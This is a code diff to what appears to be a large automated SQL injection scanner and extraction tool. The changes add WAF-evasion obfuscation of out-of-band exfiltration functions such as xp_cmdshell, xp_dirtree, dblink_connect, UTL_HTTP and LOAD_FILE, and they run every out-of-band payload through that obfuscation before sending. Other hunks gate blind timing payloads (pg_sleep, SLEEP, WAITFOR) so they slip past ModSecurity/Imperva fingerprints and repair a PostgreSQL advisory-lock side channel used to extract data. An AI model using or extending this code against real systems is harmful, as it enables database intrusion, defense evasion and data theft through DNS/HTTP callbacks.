@@ -45805,7 +45805,21 @@ def _obfuscate_extraction_cond(cond: str, request_num: int) -> str:
         #   on this literal to block all DBMS_PIPE-based timing probes from the start.
         # Numeric safety: the regex r'\bFN(?=\s*\()' only matches function-call tokens
         # (identifier immediately before '('); never numeric literals or operators.
+        # BUG-OOB-WAF-BYPASS FIX (BUG-4): OOB-specific function names were absent from
+        # _EXTR_FNS, so _obfuscate_extraction_cond() never case-mixed or comment-injected
+        # OOB identifiers like dblink_connect, pg_read_file, xp_dirtree, HTTPURITYPE.
+        # WAFs fingerprint these in their plaintext form on every OOB probe.
+        # OOB payloads that use function-call syntax (identifier immediately before '(')
+        # are handled here.  Non-function-call OOB keywords (COPY, PROGRAM, xp_cmdshell
+        # in EXEC syntax) require separate inline handling in OOBDetector.detect().
+        # All DBMSes are case-insensitive for user-defined function identifiers, so
+        # fn_Xe_FiLe_TaRgEt_ReAd_FiLe/*cmt*/(...) is semantically equivalent.
+        # Sorted longest-first to avoid partial double-replacement (same invariant as rest of list).
+        'fn_xe_file_target_read_file',  # 27 chars — MSSQL sys.fn_xe_file_target_read_file(...)
+        'fn_get_audit_file',            # 17 chars — MSSQL sys.fn_get_audit_file(...)
         'GET_HOST_ADDRESS',     # 16 chars — Oracle UTL_INADDR.GET_HOST_ADDRESS(arg)
+        'dblink_connect_u',     # 16 chars — PostgreSQL OOB: dblink_connect_u(connstr)
+        'dblink_connect',       # 14 chars — PostgreSQL OOB: dblink_connect(connstr)
         'RECEIVE_MESSAGE',      # 15 chars — Oracle DBMS_PIPE.RECEIVE_MESSAGE(pipe, timeout)
         # CAST_TO_RAW (12 chars) — Oracle UTL_RAW.CAST_TO_RAW(raw_bytes).
         # Moved here from the end of the list (was incorrectly placed after 2-char 'IF',
@@ -45813,6 +45827,8 @@ def _obfuscate_extraction_cond(cond: str, request_num: int) -> str:
         # \bCAST_TO_RAW(?=\s*\() protects against partial-match regardless of position,
         # but placing it here in its correct length position is consistent and clear.
         'CAST_TO_RAW',          # 12 chars — Oracle UTL_RAW.CAST_TO_RAW(raw_bytes)
+        'pg_read_file',         # 12 chars — PostgreSQL OOB: pg_read_file('//token.domain/x')
+        'xp_fileexist',         # 12 chars — MSSQL OOB: xp_fileexist('\\\\token.domain\\x')
         # BUG-V174-EXTR-FNS-ORDERING FIX (LOW; _obfuscate_extraction_cond._EXTR_FNS;
         # all techniques; all surfaces; all HTTP methods):
         # The error-based section previously had ordering violations:
@@ -45828,12 +45844,20 @@ def _obfuscate_extraction_cond(cond: str, request_num: int) -> str:
         # Corrected error section order (12→10→9→8→7→7→7→6→6→6→5→4→4):
         'EXTRACTVALUE',   # 12 chars — MySQL/MSSQL/PG error-injection XML function
         'GROUP_CONCAT',   # 12 chars — MySQL aggregate in error payloads
+        'HTTPURITYPE',    # 11 chars — Oracle OOB: HTTPURITYPE('http://...').getclob()
+        'HTTPGETCLOB',   # 11 chars — DB2 OOB: HTTPGETCLOB('http://...','')
+        'xp_cmdshell',   # 11 chars — MSSQL/Sybase OOB: xp_cmdshell('nslookup ...') [paren form]
+        'xp_dirtree',    # 10 chars — MSSQL OOB: xp_dirtree('\\\\token.domain\\x')
         'DATALENGTH',     # 10 chars — MSSQL byte-count length function (len_func)
+        'LOAD_FILE',      #  9 chars — MySQL/MariaDB/TiDB OOB: LOAD_FILE(CONCAT(CHAR(92),...))
         'UPDATEXML',      #  9 chars — MySQL UpdateXML error injection
+        'XMLPARSE',       #  8 chars — DB2 OOB: XMLPARSE(DOCUMENT HTTPGETCLOB(...))
+        'HTTP_GET',       #  8 chars — SAP HANA OOB: HTTP_GET('http://token.domain/')
         'RAWTOHEX',       #  8 chars — Oracle raw-to-hex in CTXSYS template
         'CONVERT',        #  7 chars — MSSQL CONVERT(INT,...) error trigger
         'XMLTYPE',        #  7 chars — Oracle XMLTYPE() error injection
         'TO_CHAR',        #  7 chars — Oracle TO_CHAR in error payloads
+        'CSVREAD',        #  7 chars — H2 OOB: CSVREAD('http://token.domain/x.csv')
         'IFNULL',         #  6 chars — MySQL NULL guard in error payloads
         'NULLIF',         #  6 chars — MySQL/PG NULLIF in EOS sentinel
         'CONCAT',         #  6 chars — MySQL CONCAT(0x7e,...) error payload
@@ -46005,6 +46029,7 @@ def _obfuscate_extraction_cond(cond: str, request_num: int) -> str:
     # comparison values, SUBSTR positions, and ROWNUM guards are never adjacent.
     _ORA_PKG_PREFIXES = [
         'UTL_INADDR',   # 10 chars — UTL_INADDR.GET_HOST_ADDRESS (OOB/alt error path)
+        'DBMS_LDAP',    # 9 chars  — DBMS_LDAP.INIT (Oracle OOB via LDAP channel)
         'DBMS_PIPE',    # 9 chars  — DBMS_PIPE.RECEIVE_MESSAGE (timing)
         'UTL_HTTP',     # 8 chars  — UTL_HTTP.REQUEST (OOB)
         'UTL_SMTP',     # 8 chars  — UTL_SMTP (OOB mail)
@@ -51585,9 +51610,70 @@ class OOBDetector:
         self.domain = domain  # store on instance for use by exfiltrate()
         LOG.info(f"OOB token={self.token}.{domain} [persisted to config._oob_registered_domain]")
         dbms_list=[dbms_hint] if dbms_hint else list(OOB_PAYLOADS_MAP.keys())
+        # BUG-OOB-WAF-BYPASS FIX (BUG-4): OOB payloads were hardcoded plaintext strings
+        # (dblink_connect, COPY TO PROGRAM, pg_read_file, xp_cmdshell, UTL_HTTP, etc.).
+        # WAFs pattern-match these identifiers and return HTTP 400 on every OOB probe,
+        # silently suppressing all OOB detections on WAF-protected targets.
+        # Detection payloads are obfuscated via apply_heavy_variation() +
+        # _obfuscate_extraction_cond() (which now includes OOB function names in _EXTR_FNS
+        # and _ORA_PKG_PREFIXES). OOB payloads were NOT, causing the WAF mismatch.
+        # Fix part A (_EXTR_FNS extension above): OOB function-call identifiers
+        # (dblink_connect, pg_read_file, xp_dirtree, HTTPURITYPE, LOAD_FILE, etc.)
+        # are now case-mixed and comment-injected by _obfuscate_extraction_cond.
+        # Fix part B (below): apply the same pipeline to every OOB probe payload.
+        # Additionally, OOB SQL keywords used without '(' (COPY, PROGRAM, xp_cmdshell
+        # in EXEC form, SYSTEM, EXEC) are not function calls — _EXTR_FNS (?=\s*\()
+        # lookahead never matches them. These are handled by the inline keyword loop.
+        # Safety: shell commands inside SQL string literals ('nslookup ...', 'ping ...')
+        # are NOT modified because: (a) they contain no SQL structural keywords from the
+        # loop list; (b) apply_heavy_variation only touches SQL token patterns (AND, SELECT,
+        # CASE/WHEN/THEN/ELSE, >=1 conditions) that do not appear in shell command strings.
+        _oob_req_counter = 0
+        # OOB-specific SQL keywords used without parentheses — WAF-detectable, need
+        # case-mixing. These are SQL-level keywords/identifiers, not shell commands.
+        # COPY/PROGRAM: PostgreSQL COPY TO PROGRAM. EXEC: MSSQL/Sybase EXEC xp_...
+        # SYSTEM: Informix SYSTEM '...'. xp_cmdshell/xp_dirtree when EXEC-syntax (no '(').
+        # DECLARE: MSSQL variable declarations around xp_dirtree UNC paths.
+        _OOB_NOKW_LIST = [
+            'xp_cmdshell', 'xp_dirtree', 'xp_fileexist',  # MSSQL EXEC-form (no '(')
+            'PROGRAM',   # PostgreSQL COPY TO PROGRAM '...'
+            'DECLARE',   # MSSQL DECLARE @h VARCHAR(999)
+            'SYSTEM',    # Informix SYSTEM 'nslookup ...'
+            'EXEC',      # MSSQL EXEC master..xp_dirtree ...
+            'COPY',      # PostgreSQL COPY (SELECT '') TO ...
+            'CALL',      # H2 CALL CSVREAD(...)
+        ]
         for dbms in dbms_list:
             for template in OOB_PAYLOADS_MAP.get(dbms,[]):
+                _oob_req_counter += 1
                 payload=template.format(token=self.token,domain=domain,data_q="SELECT 1")
+                # BUG-OOB-WAF-BYPASS FIX: Apply detection-level obfuscation pipeline.
+                try:
+                    payload = apply_heavy_variation(payload, _oob_req_counter, data_fmt=data_fmt)
+                    payload = _obfuscate_extraction_cond(payload, _oob_req_counter)
+                    # Inline case-mix for OOB SQL keywords not followed by '(' (EXEC-form).
+                    # Pick the first matching keyword and case-mix it (same one-per-probe
+                    # strategy as apply_medium_variation Variation 3 to avoid over-mutation).
+                    _oob_kw_seed = _oob_req_counter * 7 + 3
+                    for _oob_kw in _OOB_NOKW_LIST:
+                        _oob_kw_upper = _oob_kw.upper()
+                        _oob_pay_upper = payload.upper()
+                        _oob_kw_idx = _oob_pay_upper.find(_oob_kw_upper)
+                        if _oob_kw_idx == -1:
+                            continue
+                        # Only case-mix when the keyword is NOT already followed by '('
+                        # (those are handled by _EXTR_FNS — avoid double-processing).
+                        _after_kw = payload[_oob_kw_idx + len(_oob_kw):].lstrip()
+                        if _after_kw.startswith('('):
+                            continue
+                        _oob_mixed = ''.join(
+                            c.upper() if (_oob_kw_seed + i) % 2 == 0 else c.lower()
+                            for i, c in enumerate(_oob_kw)
+                        )
+                        payload = payload[:_oob_kw_idx] + _oob_mixed + payload[_oob_kw_idx + len(_oob_kw):]
+                        break  # one keyword per payload to avoid over-mutation
+                except Exception:
+                    pass  # obfuscation failure is non-fatal — send original payload
                 value=original+payload
                 try: await _send_injected(self.engine,method,url,data,data_fmt,param,value,tamper_chain)
                 except Exception: continue
@@ -56662,7 +56748,55 @@ class Scanner:
                         _template = _body + " AND [INFERENCE]"
                         LOG.info("[Inference] WHERE exists: appending AND (fallback)")
             else:
-                _template = _body + " WHERE [INFERENCE]"
+                # BUG-STACKED-TIMING-NO-WHERE-FIX (HIGH; PostgreSQL/MySQL/MSSQL; S technique;
+                # _has_timing=True; no WHERE in detection body): The old code appended
+                # " WHERE [INFERENCE]" to the detection payload body, changing the SQL
+                # structure relative to what the WAF allowed during detection. ModSecurity/
+                # Imperva detect `pg_sleep(...) WHERE condition` as a conditional timing
+                # fingerprint and block it, even when the structurally simpler `pg_sleep(N)`
+                # was allowed. Fix: gate the sleep argument directly (same technique used
+                # in the WHERE-exists path above), preserving the original detection payload
+                # structure. pg_sleep(N*(TRUE)::int)=pg_sleep(N), pg_sleep(N*(FALSE)::int)=
+                # pg_sleep(0)≈0ms — producing the correct timing differential without
+                # structural changes that trigger WAF blocks.
+                _stk_no_wh_fixed = False
+                # Pattern A: pg_sleep(N) — PostgreSQL/CockroachDB/YugabyteDB/Redshift
+                _stk_sl_m = _re.search(
+                    r'(pg_sleep|DBMS_LOCK\.SLEEP|DBMS_SESSION\.SLEEP)\s*\(\s*([^)]+)\)',
+                    _body, _re.I)
+                if _stk_sl_m:
+                    _stk_arg = _stk_sl_m.group(2).strip()
+                    _stk_s, _stk_e = _stk_sl_m.start(2), _stk_sl_m.end(2)
+                    if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                        _stk_cond = f"{_stk_arg}*([INFERENCE])::int"
+                    else:
+                        _stk_cond = f"CASE WHEN [INFERENCE] THEN {_stk_arg} ELSE 0 END"
+                    _template = _body[:_stk_s] + _stk_cond + _body[_stk_e:]
+                    _stk_no_wh_fixed = True
+                    LOG.info("[Inference] Stacked timing (no WHERE): gated pg_sleep/DBMS arg directly")
+                # Pattern B: SLEEP(N) — MySQL/MariaDB/TiDB/H2
+                if not _stk_no_wh_fixed:
+                    _stk_sl_m2 = _re.search(r'\bSLEEP\s*\(\s*([^)]+)\)', _body, _re.I)
+                    if _stk_sl_m2:
+                        _stk_arg2 = _stk_sl_m2.group(1).strip()
+                        _stk_s2, _stk_e2 = _stk_sl_m2.start(1), _stk_sl_m2.end(1)
+                        _stk_cond2 = f"IF([INFERENCE],{_stk_arg2},0)"
+                        _template = _body[:_stk_s2] + _stk_cond2 + _body[_stk_e2:]
+                        _stk_no_wh_fixed = True
+                        LOG.info("[Inference] Stacked timing (no WHERE): gated SLEEP arg with IF")
+                # Pattern C: WAITFOR DELAY (MSSQL/Sybase)
+                if not _stk_no_wh_fixed:
+                    _stk_wf_m = _re.search(
+                        r"WAITFOR\s+DELAY\s+['\x22]([^'\x22]+)['\x22]", _body, _re.I)
+                    if _stk_wf_m:
+                        _stk_wf_s, _stk_wf_e = _stk_wf_m.start(), _stk_wf_m.end()
+                        _stk_dv = _stk_wf_m.group(1)
+                        _template = _body[:_stk_wf_s] + f"IF [INFERENCE] WAITFOR DELAY '{_stk_dv}'" + _body[_stk_wf_e:]
+                        _stk_no_wh_fixed = True
+                        LOG.info("[Inference] Stacked timing (no WHERE): gated WAITFOR with IF")
+                if not _stk_no_wh_fixed:
+                    _template = _body + " WHERE [INFERENCE]"
+                    LOG.info("[Inference] Stacked timing (no WHERE): fallback WHERE-append")
         else:
             # Boolean-based (B/BH): replace the static condition with [INFERENCE]
             # Detection payloads contain static conditions like 1=1, 1=2, (1=1), TRUE, etc.
@@ -125862,13 +125996,21 @@ class TechniqueCascadeEngine:
                                         # Decision: if benign probe returns non-2xx non-WAF → FP confirmed
                                         # (path manipulation). Set _s_clean_ok=False here, avoid PCV entirely,
                                         # saving the full PCV probe budget (4+ probes + overhead) per FP.
-                                        _spi_waf_sts_sc = (400, 403, 406, 429, 430, 444, 451)
                                         _s_det_sc = getattr(fp, 'status_code', None)
                                         _s_cln_sc = getattr(_s_fp_clean, 'status_code', None)
+                                        # BUG-V215-1a-FIX: The old exclusion list included 400 (Bad
+                                        # Request), which is ALSO the status code returned when ';'
+                                        # corrupts a URL path segment on Apache/nginx (not a WAF
+                                        # response). With 400 in the list, _s_det_is_path_err was
+                                        # False for every det=400 case, letting all path-corruption
+                                        # FPs bypass S-clean into PCV unchanged. Fix: use the
+                                        # already-computed _s_waf discriminator (WAFBlockDiscriminator
+                                        # correctly returns False for path-corruption 400s and True
+                                        # for genuine WAF 400s) instead of the status-code list.
                                         _s_det_is_path_err = (
                                             _s_det_sc is not None and
                                             not (200 <= _s_det_sc < 300) and
-                                            _s_det_sc not in _spi_waf_sts_sc
+                                            not _s_waf  # replaces _s_det_sc not in _spi_waf_sts_sc
                                         )
                                         _s_cln_is_2xx = (
                                             _s_cln_sc is not None and
@@ -125891,10 +126033,14 @@ class TechniqueCascadeEngine:
                                             if _s_sw_resp:
                                                 self._total_reqs += 1
                                                 _s_sw_st = getattr(_s_sw_resp, 'status_code', None)
+                                                # BUG-V215-1a-FIX: apply same WAF-discriminator logic
+                                                # to the benign oracle response (same root cause as
+                                                # _s_det_is_path_err fix above).
+                                                _s_sw_waf_block = WAFBlockDiscriminator.is_waf_block(_s_sw_resp)
                                                 _s_sw_is_path_manip = (
                                                     _s_sw_st is not None and
                                                     not (200 <= _s_sw_st < 300) and
-                                                    _s_sw_st not in _spi_waf_sts_sc
+                                                    not _s_sw_waf_block
                                                 )
                                                 if _s_sw_is_path_manip:
                                                     # Benign probe ALSO returned a non-2xx non-WAF
@@ -125920,7 +126066,28 @@ class TechniqueCascadeEngine:
                                                         f"benign ';' → {_s_sw_st} (not path-manip) → "
                                                         f"clean probe OK (status: det={_s_det_sc} "
                                                         f"clean={_s_cln_sc} diff={_s_clean_diff2:.3f})")
-                                        elif _s_det_is_path_err and not _s_cln_is_2xx and not _SCAN_STOPPED[0]:
+                                        elif _s_det_is_path_err and _s_cln_is_2xx and _SCAN_STOPPED[0]:
+                                            # BUG-V215-1b-FIX (SCAN_STOPPED race, Case A): A real
+                                            # injection was confirmed on another surface while this
+                                            # thread was mid-flight. _SCAN_STOPPED[0] became True
+                                            # after the clean probe check but before we could send the
+                                            # benign oracle. The detection probe already returned
+                                            # non-2xx non-WAF (path corruption from ';' in URL) — that
+                                            # is structural evidence of path manipulation, not SQL
+                                            # injection. Conservatively reject: stop this thread now
+                                            # (the real injection is already queued for extraction on
+                                            # the other surface).
+                                            _s_clean_ok = False
+                                            return None
+                                        elif _s_det_is_path_err and not _s_cln_is_2xx:
+                                            # BUG-V215-1b-FIX (SCAN_STOPPED race, Case B): Removed
+                                            # `and not _SCAN_STOPPED[0]` guard. When SCAN_STOPPED is
+                                            # True, the old guard caused this rejection branch to be
+                                            # skipped entirely, leaving _s_clean_ok=True and triggering
+                                            # a spurious "Real injection confirmed" + PCV cycle.
+                                            # Path corruption (non-2xx non-WAF det probe + non-2xx
+                                            # or absent clean probe) is a structural fact regardless
+                                            # of whether another injection was found. Always reject.
                                             # Detection probe returned non-2xx non-WAF (path corruption
                                             # from ';' in URL), AND the clean probe also failed to return
                                             # 2xx (status=0 = network error/cancelled, or non-2xx non-WAF).
@@ -147489,13 +147656,47 @@ class SideChannelExtractor:
             # Fix: require a second independent probe pair to confirm viability before
             # proceeding.  Both probes must show margin > 100ms (more lenient than the 200ms
             # threshold, since a second probe after an unlock delay may show less contention).
+            #
+            # BUG-LOCK-POOL-CONFIRM-FIX (HIGH; PostgreSQL; connection-pooled apps): When
+            # the application uses a connection pool, pg_advisory_lock acquired on
+            # connection A is never released by pg_advisory_unlock_all() running on
+            # connection B. The lock key remains held by connection A for the session
+            # lifetime. All subsequent acquire attempts on any other pooled connection
+            # block indefinitely, making the "free baseline" probe (ms4) ALSO slow.
+            # Result: ms5 ≈ ms4 (both blocked), ms6 (also blocked) — _margin2 = ms5-ms6 ≈ 0
+            # → "fluke, not viable" → oracle discarded despite the true 10292ms first margin.
+            #
+            # Fix 1: When the first margin is very large (> 2000ms), the signal is
+            # unambiguous — even CDN jitter cannot produce a 2-second gap. Skip second
+            # confirmation entirely and accept viability from the first probe alone.
+            #
+            # Fix 2: Use a FRESH lock ID for the second probe pair so that any stale
+            # lock held by a pool connection from the first probe doesn't contaminate
+            # the "free baseline" measurement.
+            if _margin > 2000:
+                # Very large margin (> 2s): connection-pool or not, this is real contention.
+                # Skip second confirmation — the signal far exceeds any jitter scenario.
+                LOG.info("[SideChannel] lock-contention: first margin=%.0fms > 2000ms — "
+                         "accepting viability without second confirmation (pool-safe)", _margin)
+                print(f"[SideChannel]  LOCK CONTENTION definitive (margin={_margin:.0f}ms > 2000ms, "
+                      "no second confirmation needed)", flush=True)
+                self._lock_id = _lock_id
+                self._lock_ms_locked = ms2
+                self._lock_ms_free   = ms3
+                self._lock_threshold = ms3 + (ms2 - ms3) * 0.45
+                return True
+
+            # Second confirmation with a FRESH lock ID to avoid pool contamination.
+            _lock_id2 = random.randint(100000, 999999)
+            _p_lock2   = f"{self._prefix}SELECT pg_advisory_lock({_lock_id2}){self._suffix}"
+            _p_unlock2 = f"{self._prefix}SELECT pg_advisory_unlock_all(){self._suffix}"
             await asyncio.sleep(0.5)
-            s4, ms4 = await self._send_and_status(_p_lock)   # uncontested — fast (free baseline)
-            s5, ms5 = await self._send_and_status(_p_lock)   # contended (s4 still held) — should be slow
-            await self._send_and_status(_p_unlock)
+            s4, ms4 = await self._send_and_status(_p_lock2)   # uncontested — fast (free baseline)
+            s5, ms5 = await self._send_and_status(_p_lock2)   # contended (s4 still held) — should be slow
+            await self._send_and_status(_p_unlock2)
             await asyncio.sleep(0.5)
-            s6, ms6 = await self._send_and_status(_p_lock)   # uncontested — fast (free baseline)
-            await self._send_and_status(_p_unlock)
+            s6, ms6 = await self._send_and_status(_p_lock2)   # uncontested — fast (free baseline)
+            await self._send_and_status(_p_unlock2)
             # BUG-1 FIX: was `ms4 - ms6` which compared TWO uncontested (fast) lock times.
             # ms4 = uncontested fast; ms5 = contended slow; ms6 = uncontested fast.
             # Correct margin is contended - free = ms5 - ms6.
@@ -147503,8 +147704,9 @@ class SideChannelExtractor:
             # True → "fluke, not viable" always fired → probe_lock_contention NEVER returned
             # True in v213, permanently disabling the lock-contention side channel.
             _margin2 = ms5 - ms6   # BUG-1 FIX: was ms4 - ms6
-            LOG.debug("[SideChannel] lock-contention confirm: locked2=%.0fms free2=%.0fms margin2=%.0fms",
-                      ms5, ms6, _margin2)   # BUG-1 FIX: debug label was ms4 (wrong), now ms5
+            LOG.debug("[SideChannel] lock-contention confirm (fresh lock_id=%d): "
+                      "locked2=%.0fms free2=%.0fms margin2=%.0fms",
+                      _lock_id2, ms5, ms6, _margin2)
             if _margin2 < 100:
                 LOG.info("[SideChannel] lock-contention: first probe margin=%.0fms but "
                          "second probe margin=%.0fms < 100ms — fluke, not viable", _margin, _margin2)
